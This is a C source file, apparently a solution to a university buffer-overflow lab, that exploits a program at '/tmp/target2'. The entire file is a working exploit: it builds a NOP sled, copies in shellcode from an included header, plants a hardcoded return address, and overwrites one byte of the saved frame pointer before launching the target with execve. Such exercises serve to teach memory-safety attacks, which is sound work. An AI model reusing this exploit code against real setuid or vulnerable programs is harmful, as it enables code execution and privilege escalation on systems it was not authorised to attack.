#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define BUFFER_SIZE 241
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];
  int bsize = BUFFER_SIZE;
  int i,j;
  char buff[bsize];

 //Testing
 // for (i =0; i <=240 ;i++) {
 //    buff[i] = 'A';
 // }

  //Fill buffer with Nops
    for (i = 0; i < (236 - strlen(shellcode)) ; i++)
     buff[i] = NOP;
 
  //put shellcode into buffer
   for (j = 0, i = i; j < strlen(shellcode); i++,j++)
     buff[i] = shellcode[j];

   
  //Put the shellcode address in the end of the buffer
   long *tmp = (long *)(buff + 236);
   *tmp = 0xbffffc88;
  //Modifying the ebp to point to the shellcode address  
   buff[240] = 0x70; 
  
  
  args[0] = TARGET; 
  args[1] = buff; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
